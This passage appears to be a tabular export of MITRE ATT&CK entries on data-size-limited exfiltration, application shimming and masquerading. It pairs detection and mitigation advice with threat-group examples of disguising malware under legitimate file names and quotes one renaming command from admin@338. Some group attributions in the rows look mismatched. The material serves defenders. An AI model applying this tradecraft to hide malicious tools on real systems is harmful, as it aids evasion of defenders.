573,"['Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). If a process maintains a long connection during which it consistently sends fixed size data packets or a process opens connections and sends fixed sized data packets at regular intervals, it may be performing an aggregate data transfer. Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.[[CiteRef::University of Birmingham C2]]']",[],[],[],"['Packet capture', 'Netflow/Enclave netflow', 'Process use of network', 'Process monitoring']",['[[Group/G0027|Threat Group-3390]] actors have split RAR files for exfiltration into parts.[[CiteRef::Dell TG-3390]]'],['Threat Group-3390'],"['Threat Group-3390', 'TG-3390', 'Emissary Panda', 'BRONZE UNION']",['G0027'],"['Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary command and control infrastructure and malware can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and may be based on the specific obfuscation technique used by a particular adversary or tool, and will likely be different across various malware families and versions. Adversaries will likely change tool command and control signatures over time or construct protocols in such a way to avoid detection by common defensive tools.[[CiteRef::University of Birmingham C2]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],[],['Exfiltration'],['Technique/T1030'],['Data Transfer Size Limits'],https://attack.mitre.org/wiki/Technique/T1030
574,['There are several public tools available that will detect shims that are currently available[[CiteRef::Black Hat 2015 App Shim]]:\n\n* Shim-Process-Scanner - checks memory of every running process for any Shim flags\n* Shim-Detector-Lite - detects installation of custom shim databases\n* Shim-Guard - monitors registry for any shim installations\n* ShimScanner - forensic tool to find active shims in memory\n* ShimCacheMem - Volatility plug-in that pulls shim cache from memory (note: shims are only cached after reboot)\n\nMonitor process execution for sdbinst.exe and command-line arguments for potential indications of application shim abuse.'],[],[],[],"['Loaded DLLs', 'System calls', 'Windows Registry', 'Process Monitoring', 'Process command-line parameters']",['[[Group/G0046|FIN7]] has used application shim databases for persistence.[[CiteRef::FireEye FIN7 Shim Databases]]'],['FIN7'],['FIN7'],['G0046'],"['There currently aren\'t a lot of ways to mitigate application shimming. Disabling the Shim Engine isn\'t recommended because Windows depends on shimming for interoperability and software may become unstable or not work. Microsoft released an optional patch update - KB3045645 - that will remove the ""auto-elevate"" flag within the sdbinst.exe. This will prevent use of application shimming to bypass UAC. \n\nChanging UAC settings to ""Always Notify"" will give the user more visibility when UAC elevation is requested, however, this option will not be popular among users due to the constant UAC interruptions.']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']",['Administrator'],[],[],"['Execution', 'Persistence', 'Privilege Escalation']",['Technique/T1138'],['Application Shimming'],https://attack.mitre.org/wiki/Technique/T1138
575,"[""Collect file hashes; file names that do not match their expected hash are suspect. Perform file monitoring; files with known names but in unusual locations are suspect. Likewise, files that are modified outside of an update or patch are suspect.\n\nIf file names are mismatched between the binary name on disk and the binary's resource section, this is a likely indicator that a binary was renamed after it was compiled. Collecting and comparing disk and resource filenames for binaries could provide useful leads, but may not always be indicative of malicious activity.[[CiteRef::Endgame Masquerade Ball]]""]",['Whitelisting by file name or path'],[],['ENDGAME'],"['File monitoring', 'Process monitoring', 'Binary file metadata']","['[[Group/G0008|Carbanak]] malware names itself ""svchost.exe,"" which is the name of the Windows shared service host program.[[CiteRef::Kaspersky Carbanak]]']",['Carbanak'],"['Carbanak', 'Anunak']",['G0008'],"['When creating security rules, avoid exclusions based on file name or file path. Require signed binaries. Use file system access controls to protect folders such as C:\\Windows\\System32. Use tools that restrict program execution via whitelisting by attributes other than file name.\n\nIdentify potentially malicious software that may look like a legitimate program based on name and location, and audit and/or block it by using whitelisting[[CiteRef::Beechey 2010]] tools like AppLocker[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],[],['Defense Evasion'],['Technique/T1036'],['Masquerading'],https://attack.mitre.org/wiki/Technique/T1036
576,"[""Collect file hashes; file names that do not match their expected hash are suspect. Perform file monitoring; files with known names but in unusual locations are suspect. Likewise, files that are modified outside of an update or patch are suspect.\n\nIf file names are mismatched between the binary name on disk and the binary's resource section, this is a likely indicator that a binary was renamed after it was compiled. Collecting and comparing disk and resource filenames for binaries could provide useful leads, but may not always be indicative of malicious activity.[[CiteRef::Endgame Masquerade Ball]]""]",['Whitelisting by file name or path'],[],['ENDGAME'],"['File monitoring', 'Process monitoring', 'Binary file metadata']",[u'[[Group/G0046|FIN7]] has created a scheduled task named \u201cAdobeFlashSync\u201d to establish persistence.[[CiteRef::Morphisec FIN7 June 2017]]'],['FIN7'],['FIN7'],['G0046'],"['When creating security rules, avoid exclusions based on file name or file path. Require signed binaries. Use file system access controls to protect folders such as C:\\Windows\\System32. Use tools that restrict program execution via whitelisting by attributes other than file name.\n\nIdentify potentially malicious software that may look like a legitimate program based on name and location, and audit and/or block it by using whitelisting[[CiteRef::Beechey 2010]] tools like AppLocker[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],[],['Defense Evasion'],['Technique/T1036'],['Masquerading'],https://attack.mitre.org/wiki/Technique/T1036
577,"[""Collect file hashes; file names that do not match their expected hash are suspect. Perform file monitoring; files with known names but in unusual locations are suspect. Likewise, files that are modified outside of an update or patch are suspect.\n\nIf file names are mismatched between the binary name on disk and the binary's resource section, this is a likely indicator that a binary was renamed after it was compiled. Collecting and comparing disk and resource filenames for binaries could provide useful leads, but may not always be indicative of malicious activity.[[CiteRef::Endgame Masquerade Ball]]""]",['Whitelisting by file name or path'],[],['ENDGAME'],"['File monitoring', 'Process monitoring', 'Binary file metadata']","[""[[Software/S0070|HTTPBrowser]]'s installer contains a malicious file named navlu.dll to decrypt and run the RAT. navlu.dll is also the name of a legitimate Symantec DLL.[[CiteRef::ZScaler Hacking Team]]""]",['APT18'],"['APT18', 'Threat Group-0416', 'TG-0416', 'Dynamite Panda']",['G0026'],"['When creating security rules, avoid exclusions based on file name or file path. Require signed binaries. Use file system access controls to protect folders such as C:\\Windows\\System32. Use tools that restrict program execution via whitelisting by attributes other than file name.\n\nIdentify potentially malicious software that may look like a legitimate program based on name and location, and audit and/or block it by using whitelisting[[CiteRef::Beechey 2010]] tools like AppLocker[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],"Software: HTTPBrowser, Token Control, HttpDump",['Defense Evasion'],['Technique/T1036'],['Masquerading'],https://attack.mitre.org/wiki/Technique/T1036
578,"[""Collect file hashes; file names that do not match their expected hash are suspect. Perform file monitoring; files with known names but in unusual locations are suspect. Likewise, files that are modified outside of an update or patch are suspect.\n\nIf file names are mismatched between the binary name on disk and the binary's resource section, this is a likely indicator that a binary was renamed after it was compiled. Collecting and comparing disk and resource filenames for binaries could provide useful leads, but may not always be indicative of malicious activity.[[CiteRef::Endgame Masquerade Ball]]""]",['Whitelisting by file name or path'],[],['ENDGAME'],"['File monitoring', 'Process monitoring', 'Binary file metadata']","['The [[Software/S0125|Remsec]] loader implements itself with the name Security Support Provider, a legitimate Windows function. Various [[Software/S0125|Remsec]] .exe files mimic legitimate file names used by Microsoft, Symantec, Kaspersky, Hewlett-Packard, and VMWare.[[CiteRef::Symantec Remsec IOCs]][[CiteRef::Kaspersky ProjectSauron Full Report]] [[Software/S0125|Remsec]] also disguised malicious modules using similar filenames as custom network encryption software on victims.[[CiteRef::Kaspersky ProjectSauron Full Report]]']",['Strider'],"['Strider', 'ProjectSauron']",['G0041'],"['When creating security rules, avoid exclusions based on file name or file path. Require signed binaries. Use file system access controls to protect folders such as C:\\Windows\\System32. Use tools that restrict program execution via whitelisting by attributes other than file name.\n\nIdentify potentially malicious software that may look like a legitimate program based on name and location, and audit and/or block it by using whitelisting[[CiteRef::Beechey 2010]] tools like AppLocker[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],"Software: Remsec, Backdoor.Remsec, ProjectSauron",['Defense Evasion'],['Technique/T1036'],['Masquerading'],https://attack.mitre.org/wiki/Technique/T1036
579,"[""Collect file hashes; file names that do not match their expected hash are suspect. Perform file monitoring; files with known names but in unusual locations are suspect. Likewise, files that are modified outside of an update or patch are suspect.\n\nIf file names are mismatched between the binary name on disk and the binary's resource section, this is a likely indicator that a binary was renamed after it was compiled. Collecting and comparing disk and resource filenames for binaries could provide useful leads, but may not always be indicative of malicious activity.[[CiteRef::Endgame Masquerade Ball]]""]",['Whitelisting by file name or path'],[],['ENDGAME'],"['File monitoring', 'Process monitoring', 'Binary file metadata']","[""The file name AcroRD32.exe, a legitimate process name for Adobe's Acrobat Reader, was used by [[Group/G0006|APT1]] as a name for malware.[[CiteRef::Mandiant APT1 Appendix]]""]",['APT1'],"['APT1', 'Comment Crew', 'Comment Group', 'Comment Panda']",['G0006'],"['When creating security rules, avoid exclusions based on file name or file path. Require signed binaries. Use file system access controls to protect folders such as C:\\Windows\\System32. Use tools that restrict program execution via whitelisting by attributes other than file name.\n\nIdentify potentially malicious software that may look like a legitimate program based on name and location, and audit and/or block it by using whitelisting[[CiteRef::Beechey 2010]] tools like AppLocker[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],[],['Defense Evasion'],['Technique/T1036'],['Masquerading'],https://attack.mitre.org/wiki/Technique/T1036
580,"[""Collect file hashes; file names that do not match their expected hash are suspect. Perform file monitoring; files with known names but in unusual locations are suspect. Likewise, files that are modified outside of an update or patch are suspect.\n\nIf file names are mismatched between the binary name on disk and the binary's resource section, this is a likely indicator that a binary was renamed after it was compiled. Collecting and comparing disk and resource filenames for binaries could provide useful leads, but may not always be indicative of malicious activity.[[CiteRef::Endgame Masquerade Ball]]""]",['Whitelisting by file name or path'],[],['ENDGAME'],"['File monitoring', 'Process monitoring', 'Binary file metadata']",['[[Software/S0136|USBStealer]] mimics a legitimate Russian program called USB Disk Security.[[CiteRef::ESET Sednit USBStealer 2014]]'],['APT28'],"['APT28', 'Sednit', 'Sofacy', 'Pawn Storm', 'Fancy Bear', 'STRONTIUM', 'Tsar Team', 'Threat Group-4127', 'TG-4127']",['G0007'],"['When creating security rules, avoid exclusions based on file name or file path. Require signed binaries. Use file system access controls to protect folders such as C:\\Windows\\System32. Use tools that restrict program execution via whitelisting by attributes other than file name.\n\nIdentify potentially malicious software that may look like a legitimate program based on name and location, and audit and/or block it by using whitelisting[[CiteRef::Beechey 2010]] tools like AppLocker[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],"Software: USBStealer, USB Stealer, Win32/USBStealer",['Defense Evasion'],['Technique/T1036'],['Masquerading'],https://attack.mitre.org/wiki/Technique/T1036
581,"[""Collect file hashes; file names that do not match their expected hash are suspect. Perform file monitoring; files with known names but in unusual locations are suspect. Likewise, files that are modified outside of an update or patch are suspect.\n\nIf file names are mismatched between the binary name on disk and the binary's resource section, this is a likely indicator that a binary was renamed after it was compiled. Collecting and comparing disk and resource filenames for binaries could provide useful leads, but may not always be indicative of malicious activity.[[CiteRef::Endgame Masquerade Ball]]""]",['Whitelisting by file name or path'],[],['ENDGAME'],"['File monitoring', 'Process monitoring', 'Binary file metadata']","['[[Software/S0138|OLDBAIT]] installs itself in <code>%ALLUSERPROFILE%\\\\Application Data\\Microsoft\\MediaPlayer\\updatewindws.exe</code>; the directory name is missing a space and the file name is missing the letter ""o.""[[CiteRef::FireEye APT28]]']",['APT28'],"['APT28', 'Sednit', 'Sofacy', 'Pawn Storm', 'Fancy Bear', 'STRONTIUM', 'Tsar Team', 'Threat Group-4127', 'TG-4127']",['G0007'],"['When creating security rules, avoid exclusions based on file name or file path. Require signed binaries. Use file system access controls to protect folders such as C:\\Windows\\System32. Use tools that restrict program execution via whitelisting by attributes other than file name.\n\nIdentify potentially malicious software that may look like a legitimate program based on name and location, and audit and/or block it by using whitelisting[[CiteRef::Beechey 2010]] tools like AppLocker[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],"Software: OLDBAIT, Sasfis",['Defense Evasion'],['Technique/T1036'],['Masquerading'],https://attack.mitre.org/wiki/Technique/T1036
582,"[""Collect file hashes; file names that do not match their expected hash are suspect. Perform file monitoring; files with known names but in unusual locations are suspect. Likewise, files that are modified outside of an update or patch are suspect.\n\nIf file names are mismatched between the binary name on disk and the binary's resource section, this is a likely indicator that a binary was renamed after it was compiled. Collecting and comparing disk and resource filenames for binaries could provide useful leads, but may not always be indicative of malicious activity.[[CiteRef::Endgame Masquerade Ball]]""]",['Whitelisting by file name or path'],[],['ENDGAME'],"['File monitoring', 'Process monitoring', 'Binary file metadata']","['In one instance, [[Group/G0045|menuPass]] added [[Software/S0013|PlugX]] as a service with a display name of ""Corel Writing Tools Utility.""[[CiteRef::FireEye APT10 April 2017]]']",['DragonOK'],['DragonOK'],['G0017'],"['When creating security rules, avoid exclusions based on file name or file path. Require signed binaries. Use file system access controls to protect folders such as C:\\Windows\\System32. Use tools that restrict program execution via whitelisting by attributes other than file name.\n\nIdentify potentially malicious software that may look like a legitimate program based on name and location, and audit and/or block it by using whitelisting[[CiteRef::Beechey 2010]] tools like AppLocker[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],"Software: PlugX, Sogu, Kaba",['Defense Evasion'],['Technique/T1036'],['Masquerading'],https://attack.mitre.org/wiki/Technique/T1036
583,"[""Collect file hashes; file names that do not match their expected hash are suspect. Perform file monitoring; files with known names but in unusual locations are suspect. Likewise, files that are modified outside of an update or patch are suspect.\n\nIf file names are mismatched between the binary name on disk and the binary's resource section, this is a likely indicator that a binary was renamed after it was compiled. Collecting and comparing disk and resource filenames for binaries could provide useful leads, but may not always be indicative of malicious activity.[[CiteRef::Endgame Masquerade Ball]]""]",['Whitelisting by file name or path'],[],['ENDGAME'],"['File monitoring', 'Process monitoring', 'Binary file metadata']","['If installing itself as a service fails, [[Software/S0081|Elise]] instead writes itself as a file named svchost.exe saved in %APPDATA%\\Microsoft\\Network.[[CiteRef::Lotus Blossom Jun 2015]]']",['Lotus Blossom'],"['Lotus Blossom', 'Spring Dragon']",['G0030'],"['When creating security rules, avoid exclusions based on file name or file path. Require signed binaries. Use file system access controls to protect folders such as C:\\Windows\\System32. Use tools that restrict program execution via whitelisting by attributes other than file name.\n\nIdentify potentially malicious software that may look like a legitimate program based on name and location, and audit and/or block it by using whitelisting[[CiteRef::Beechey 2010]] tools like AppLocker[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],"Software: Elise, BKDR_ESILE, Page",['Defense Evasion'],['Technique/T1036'],['Masquerading'],https://attack.mitre.org/wiki/Technique/T1036
584,"[""Collect file hashes; file names that do not match their expected hash are suspect. Perform file monitoring; files with known names but in unusual locations are suspect. Likewise, files that are modified outside of an update or patch are suspect.\n\nIf file names are mismatched between the binary name on disk and the binary's resource section, this is a likely indicator that a binary was renamed after it was compiled. Collecting and comparing disk and resource filenames for binaries could provide useful leads, but may not always be indicative of malicious activity.[[CiteRef::Endgame Masquerade Ball]]""]",['Whitelisting by file name or path'],[],['ENDGAME'],"['File monitoring', 'Process monitoring', 'Binary file metadata']","['A [[Software/S0141|Winnti]] implant file was named ASPNET_FILTER.DLL, mimicking the legitimate ASP.NET ISAPI filter DLL with the same name.[[CiteRef::Microsoft Winnti Jan 2017]]']",['Winnti Group'],"['Winnti Group', 'Blackfly']",['G0044'],"['When creating security rules, avoid exclusions based on file name or file path. Require signed binaries. Use file system access controls to protect folders such as C:\\Windows\\System32. Use tools that restrict program execution via whitelisting by attributes other than file name.\n\nIdentify potentially malicious software that may look like a legitimate program based on name and location, and audit and/or block it by using whitelisting[[CiteRef::Beechey 2010]] tools like AppLocker[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],Software: Winnti,['Defense Evasion'],['Technique/T1036'],['Masquerading'],https://attack.mitre.org/wiki/Technique/T1036
585,"[""Collect file hashes; file names that do not match their expected hash are suspect. Perform file monitoring; files with known names but in unusual locations are suspect. Likewise, files that are modified outside of an update or patch are suspect.\n\nIf file names are mismatched between the binary name on disk and the binary's resource section, this is a likely indicator that a binary was renamed after it was compiled. Collecting and comparing disk and resource filenames for binaries could provide useful leads, but may not always be indicative of malicious activity.[[CiteRef::Endgame Masquerade Ball]]""]",['Whitelisting by file name or path'],[],['ENDGAME'],"['File monitoring', 'Process monitoring', 'Binary file metadata']","[u'To establish persistence, [[Software/S0058|SslMM]] identifies the Start Menu Startup directory and drops a link to its own executable disguised as an \u201cOffice Start,\u201d \u201cYahoo Talk,\u201d \u201cMSN Gaming Z0ne,\u201d or \u201cMSN Talk\u201d shortcut.[[CiteRef::Baumgartner Naikon 2015]]']",['Naikon'],['Naikon'],['G0019'],"['When creating security rules, avoid exclusions based on file name or file path. Require signed binaries. Use file system access controls to protect folders such as C:\\Windows\\System32. Use tools that restrict program execution via whitelisting by attributes other than file name.\n\nIdentify potentially malicious software that may look like a legitimate program based on name and location, and audit and/or block it by using whitelisting[[CiteRef::Beechey 2010]] tools like AppLocker[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],Software: SslMM,['Defense Evasion'],['Technique/T1036'],['Masquerading'],https://attack.mitre.org/wiki/Technique/T1036
586,"[""Collect file hashes; file names that do not match their expected hash are suspect. Perform file monitoring; files with known names but in unusual locations are suspect. Likewise, files that are modified outside of an update or patch are suspect.\n\nIf file names are mismatched between the binary name on disk and the binary's resource section, this is a likely indicator that a binary was renamed after it was compiled. Collecting and comparing disk and resource filenames for binaries could provide useful leads, but may not always be indicative of malicious activity.[[CiteRef::Endgame Masquerade Ball]]""]",['Whitelisting by file name or path'],[],['ENDGAME'],"['File monitoring', 'Process monitoring', 'Binary file metadata']","['[[Group/G0018|admin@338]] actors used the following command to rename one of their tools to a benign file name: <code>ren ""%temp%\\upload"" audiodg.exe</code>[[CiteRef::FireEye admin@338]]']",['admin@338'],['admin@338'],['G0018'],"['When creating security rules, avoid exclusions based on file name or file path. Require signed binaries. Use file system access controls to protect folders such as C:\\Windows\\System32. Use tools that restrict program execution via whitelisting by attributes other than file name.\n\nIdentify potentially malicious software that may look like a legitimate program based on name and location, and audit and/or block it by using whitelisting[[CiteRef::Beechey 2010]] tools like AppLocker[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],[],['Defense Evasion'],['Technique/T1036'],['Masquerading'],https://attack.mitre.org/wiki/Technique/T1036
587,"[""Collect file hashes; file names that do not match their expected hash are suspect. Perform file monitoring; files with known names but in unusual locations are suspect. Likewise, files that are modified outside of an update or patch are suspect.\n\nIf file names are mismatched between the binary name on disk and the binary's resource section, this is a likely indicator that a binary was renamed after it was compiled. Collecting and comparing disk and resource filenames for binaries could provide useful leads, but may not always be indicative of malicious activity.[[CiteRef::Endgame Masquerade Ball]]""]",['Whitelisting by file name or path'],[],['ENDGAME'],"['File monitoring', 'Process monitoring', 'Binary file metadata']","['[[Software/S0118|Nidiran]] can create a new service named msamger (Microsoft Security Accounts Manager), which mimics the legitimate Microsoft database by the same name.[[CiteRef::Symantec Backdoor.Nidiran]][[CiteRef::Microsoft SAM]]']",['Suckfly'],['Suckfly'],['G0039'],"['When creating security rules, avoid exclusions based on file name or file path. Require signed binaries. Use file system access controls to protect folders such as C:\\Windows\\System32. Use tools that restrict program execution via whitelisting by attributes other than file name.\n\nIdentify potentially malicious software that may look like a legitimate program based on name and location, and audit and/or block it by using whitelisting[[CiteRef::Beechey 2010]] tools like AppLocker[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],"Software: Nidiran, Backdoor.Nidiran",['Defense Evasion'],['Technique/T1036'],['Masquerading'],https://attack.mitre.org/wiki/Technique/T1036
588,"[""Collect file hashes; file names that do not match their expected hash are suspect. Perform file monitoring; files with known names but in unusual locations are suspect. Likewise, files that are modified outside of an update or patch are suspect.\n\nIf file names are mismatched between the binary name on disk and the binary's resource section, this is a likely indicator that a binary was renamed after it was compiled. Collecting and comparing disk and resource filenames for binaries could provide useful leads, but may not always be indicative of malicious activity.[[CiteRef::Endgame Masquerade Ball]]""]",['Whitelisting by file name or path'],[],['ENDGAME'],"['File monitoring', 'Process monitoring', 'Binary file metadata']","['[[Group/G0050|APT32]] has used hidden or non-printing characters to help masquerade file names on a system, such as appending a Unicode no-break space character to a legitimate service name.[[CiteRef::FireEye APT32 May 2017]]']",['APT32'],"['APT32', 'OceanLotus Group']",['G0050'],"['When creating security rules, avoid exclusions based on file name or file path. Require signed binaries. Use file system access controls to protect folders such as C:\\Windows\\System32. Use tools that restrict program execution via whitelisting by attributes other than file name.\n\nIdentify potentially malicious software that may look like a legitimate program based on name and location, and audit and/or block it by using whitelisting[[CiteRef::Beechey 2010]] tools like AppLocker[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],[],['Defense Evasion'],['Technique/T1036'],['Masquerading'],https://attack.mitre.org/wiki/Technique/T1036
589,"[""Collect file hashes; file names that do not match their expected hash are suspect. Perform file monitoring; files with known names but in unusual locations are suspect. Likewise, files that are modified outside of an update or patch are suspect.\n\nIf file names are mismatched between the binary name on disk and the binary's resource section, this is a likely indicator that a binary was renamed after it was compiled. Collecting and comparing disk and resource filenames for binaries could provide useful leads, but may not always be indicative of malicious activity.[[CiteRef::Endgame Masquerade Ball]]""]",['Whitelisting by file name or path'],[],['ENDGAME'],"['File monitoring', 'Process monitoring', 'Binary file metadata']","['[[Software/S0083|Misdat]] saves itself as a file named msdtc.exe, which is also the name of the legitimate Microsoft Distributed Transaction Coordinator service.[[CiteRef::Cylance Dust Storm]][[CiteRef::Microsoft DTC]]']",['Dust Storm'],['Dust Storm'],['G0031'],"['When creating security rules, avoid exclusions based on file name or file path. Require signed binaries. Use file system access controls to protect folders such as C:\\Windows\\System32. Use tools that restrict program execution via whitelisting by attributes other than file name.\n\nIdentify potentially malicious software that may look like a legitimate program based on name and location, and audit and/or block it by using whitelisting[[CiteRef::Beechey 2010]] tools like AppLocker[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],Software: Misdat,['Defense Evasion'],['Technique/T1036'],['Masquerading'],https://attack.mitre.org/wiki/Technique/T1036
590,"[""Collect file hashes; file names that do not match their expected hash are suspect. Perform file monitoring; files with known names but in unusual locations are suspect. Likewise, files that are modified outside of an update or patch are suspect.\n\nIf file names are mismatched between the binary name on disk and the binary's resource section, this is a likely indicator that a binary was renamed after it was compiled. Collecting and comparing disk and resource filenames for binaries could provide useful leads, but may not always be indicative of malicious activity.[[CiteRef::Endgame Masquerade Ball]]""]",['Whitelisting by file name or path'],[],['ENDGAME'],"['File monitoring', 'Process monitoring', 'Binary file metadata']","['[[Software/S0084|Mis-Type]] saves itself as a file named msdtc.exe, which is also the name of the legitimate Microsoft Distributed Transaction Coordinator service.[[CiteRef::Cylance Dust Storm]][[CiteRef::Microsoft DTC]]']",['Dust Storm'],['Dust Storm'],['G0031'],"['When creating security rules, avoid exclusions based on file name or file path. Require signed binaries. Use file system access controls to protect folders such as C:\\Windows\\System32. Use tools that restrict program execution via whitelisting by attributes other than file name.\n\nIdentify potentially malicious software that may look like a legitimate program based on name and location, and audit and/or block it by using whitelisting[[CiteRef::Beechey 2010]] tools like AppLocker[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs 